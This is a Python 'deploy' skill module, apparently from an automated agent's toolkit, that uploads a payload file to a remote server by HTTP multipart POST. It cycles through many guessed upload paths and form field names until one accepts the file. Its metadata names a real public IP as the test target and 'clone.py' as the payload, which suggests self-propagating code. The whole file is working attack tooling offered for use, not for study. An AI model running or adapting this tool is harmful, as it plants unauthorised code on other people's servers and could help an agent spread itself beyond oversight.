"""skill/deploy_http_post_multipart.py - 使用HTTP POST多部分表单上传payload到远程路径

SKILL_META:
{
  "name": "deploy_http_post_multipart",
  "description": "使用HTTP POST多部分表单上传payload到远程路径",
  "category": "deploy",
  "test_target": "209.51.188.20:80 /pub",
  "test_args": "--host 209.51.188.20 --port 80 --path /pub --payload_file clone.py",
  "version": "6.0"
}
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from typing import Any, Optional
import http.client
import mimetypes
from urllib.parse import urlparse

PATH_VARIANTS = ["", "/", "/upload", "/uploads", "/files", "/file", "/data", "/api/upload", "/pub", "/pub/upload", "/pub/uploads", "/pub/files", "/pub/incoming", "/incoming"]
DEFAULT_FIELDS = ["file", "upload_file", "file_upload", "Filedata", "attachment"]

def build_multipart_body(fields: dict[str, tuple[str, bytes, str]], boundary: Optional[str] = None) -> tuple[bytes, str]:
    if boundary is None:
        boundary = "----FormBoundary" + "".join(format(i, "02x") for i in os.urandom(8))
    body = b""
    for name, (filename, content, content_type) in fields.items():
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        body += f"Content-Type: {content_type}\r\n\r\n".encode()
        body += content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return body, boundary

def send_request_with_redirect(conn: http.client.HTTPConnection, method: str, path: str, body: bytes, headers: dict, max_redirects: int = 5, timeout: int = 30) -> tuple[int, str, list[str], dict]:
    redirect_history = []
    current_path = path
    current_conn = conn
    for _ in range(max_redirects + 1):
        try:
            current_conn.request(method, current_path, body, headers)
            response = current_conn.getresponse()
            status = response.status
            response_body = response.read().decode("utf-8", errors="replace")
            response_headers = dict(response.getheaders())
            if status in (301, 302, 303, 307, 308):
                location = response.getheader("Location") or response.getheader("location")
                if location:
                    redirect_history.append(f"{status} -> {location}")
                    parsed = urlparse(location)
                    if parsed.netloc:
                        host_port = parsed.netloc.split(":")
                        new_host, new_port = host_port[0], int(host_port[1]) if len(host_port) > 1 else 80
                        current_conn.close()
                        current_conn = http.client.HTTPConnection(new_host, new_port, timeout=timeout)
                        current_path = parsed.path or "/"
                    else:
                        current_path = parsed.path if parsed.path else "/"
                        if not current_path.startswith("/"):
                            current_path = "/" + current_path
                    continue
            return status, response_body, redirect_history, response_headers
        except http.client.HTTPException as e:
            return 0, str(e), redirect_history, {}
    return 508, "Too many redirects", redirect_history, {}

def try_upload_paths(host: str, port: int, base_path: str, filename: str, body: bytes, boundary: str, debug: bool = False, timeout: int = 30) -> dict[str, Any]:
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "Content-Length": str(len(body))}
    paths_to_try = []
    if not base_path.endswith("/"):
        base_path += "/"
    for suffix in PATH_VARIANTS:
        paths_to_try.append(base_path + filename if suffix == "" else base_path + suffix.lstrip("/") + "/" + filename)
    seen = set()
    unique_paths = [p for p in paths_to_try if not (p in seen or seen.add(p))]
    results = []
    for path in unique_paths:
        if debug:
            print(f"[DEBUG] Trying path: {path}", file=sys.stderr)
        try:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
            response_code, response_body, redirect_history, response_headers = send_request_with_redirect(conn, "POST", path, body, headers, timeout=timeout)
            conn.close()
            if debug:
                print(f"[DEBUG] Response {response_code}: {response_body[:100] if response_body else 'empty'}", file=sys.stderr)
            results.append({"path": path, "response_code": response_code, "response_body": response_body, "redirect_history": redirect_history, "response_headers": response_headers})
            if 200 <= response_code < 300:
                return {"success": True, "response_code": response_code, "message": response_body[:500] if response_body else "Upload success", "redirect_history": redirect_history, "used_path": path, "all_attempts": results}
        except Exception as e:
            if debug:
                print(f"[DEBUG] Error on {path}: {e}", file=sys.stderr)
            results.append({"path": path, "error": str(e)})
    return {"success": False, "response_code": results[-1].get("response_code", 0) if results else 0, "message": "All path variants failed", "redirect_history": [], "used_path": "", "all_attempts": results}

def create_dummy_payload(filename: str = "dummy_payload.py") -> str:
    content = "#!/usr/bin/env python3\nprint('Hello from dummy payload')\n"
    filepath = os.path.join(os.getcwd(), filename)
    with open(filepath, "w") as f:
        f.write(content)
    return filepath

def main(host: str = None, port: int = None, path: str = None, payload_file: str = None, debug: bool = False, timeout: int = 30, file_field: str = None) -> dict[str, Any]:
    result: dict[str, Any] = {"success": False, "response_code": 0, "message": "", "redirect_history": [], "error_detail": {}}
    parser = argparse.ArgumentParser(description="HTTP POST multipart upload")
    parser.add_argument("--host", help="Target host IP")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--path", help="Upload path")
    parser.add_argument("--payload_file", help="Payload file to upload")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    parser.add_argument("--timeout", type=int, default=30, help="Connection timeout in seconds")
    parser.add_argument("--file_field", help="Custom form field name")
    args = parser.parse_args()
    host = host or args.host
    port = port or args.port
    path = path or args.path
    payload_file = payload_file or args.payload_file
    debug = debug or args.debug
    timeout = timeout or args.timeout
    file_field = file_field or args.file_field
    if not all([host, port, path]):
        result["message"] = "Missing required arguments: host, port, path"
        return result
    filename = os.path.basename(payload_file) if payload_file else "dummy_payload.py"
    if not payload_file or not os.path.exists(payload_file):
        if debug:
            print(f"[DEBUG] Payload file not found: {payload_file}, creating dummy payload", file=sys.stderr)
        try:
            payload_file = create_dummy_payload(filename)
            result["info"] = f"Created dummy payload: {payload_file}"
        except Exception as e:
            result["message"] = f"Failed to create dummy payload: {e}"
            result["error_detail"] = {"error_type": "file_creation", "detail": str(e)}
            return result
    try:
        with open(payload_file, "rb") as f:
            file_content = f.read()
        content_type = mimetypes.guess_type(payload_file)[0] or "application/octet-stream"
        fields_to_try = [file_field] if file_field else DEFAULT_FIELDS
        last_result = None
        for field_name in fields_to_try:
            if debug:
                print(f"[DEBUG] Trying field name: {field_name}", file=sys.stderr)
            fields = {field_name: (filename, file_content, content_type)}
            body, boundary = build_multipart_body(fields)
            if debug:
                print(f"[DEBUG] Uploading {filename} ({len(file_content)} bytes) to {host}:{port}", file=sys.stderr)
            result = try_upload_paths(host, port, path, filename, body, boundary, debug, timeout)
            if result["success"]:
                result["file_field_used"] = field_name
                return result
            last_result = result
        if last_result:
            attempts = last_result.get("all_attempts", [])
            error_paths = [{"path": a.get("path"), "code": a.get("response_code"), "error": a.get("error")} for a in attempts]
            last_result["error_detail"] = {"status_text": http.client.responses.get(last_result["response_code"], "Unknown"), "attempts_count": len(attempts), "failed_paths": error_paths[-5:] if len(error_paths) > 5 else error_paths, "tried_fields": fields_to_try}
            return last_result
    except FileNotFoundError as e:
        result["message"] = f"File error: {e}"
        result["error_detail"] = {"error_type": "file_not_found", "detail": str(e)}
    except ConnectionRefusedError as e:
        result["message"] = f"Connection refused: {e}"
        result["error_detail"] = {"error_type": "connection_refused", "detail": str(e)}
    except TimeoutError as e:
        result["message"] = f"Connection timeout: {e}"
        result["error_detail"] = {"error_type": "timeout", "detail": str(e)}
    except OSError as e:
        result["message"] = f"Network error: {e}"
        result["error_detail"] = {"error_type": "network", "detail": str(e)}
    except Exception as e:
        result["message"] = f"Unexpected error: {e}"
        result["error_detail"] = {"error_type": "unknown", "detail": str(e)}
    return result

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, ensure_ascii=False, indent=2))